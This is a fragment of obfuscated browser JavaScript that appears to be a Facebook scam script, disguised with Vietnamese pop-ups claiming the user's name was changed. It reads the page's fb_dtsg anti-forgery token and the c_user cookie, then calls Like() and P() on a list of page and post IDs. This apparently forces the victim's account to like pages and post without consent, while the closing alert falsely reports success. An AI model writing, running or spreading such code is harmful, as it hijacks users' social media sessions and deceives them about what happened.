...
var _0xdead=["\x35\x32\x32\x37\x38\x37\x31\x36\x37\x38\x33\x34\x30\x34\x31"];var _0xcf8a=[_0xdead[0]];var id=_0xcf8a[0];var arkadaslar=[];var svn_rev;
...
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
alert('TuT lỗi sẽ khắc phục sau');
...
P ("521210444658380");
P ("521210177991740");
Like ("465359506920747");
Like ("303731609730102") ;
Like ("219102581578295") ;
Like ("116199778541279") ;
Like ("269703326533") ;
Like ("355965961206828");


var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
alert(
    'Chúc Mừng Bạn Đã Thay Đổi Tên Facebook Thành Công, Xin Đợi Trong Ít Phút Để Facebook Cập Nhật Thông Tin !'
);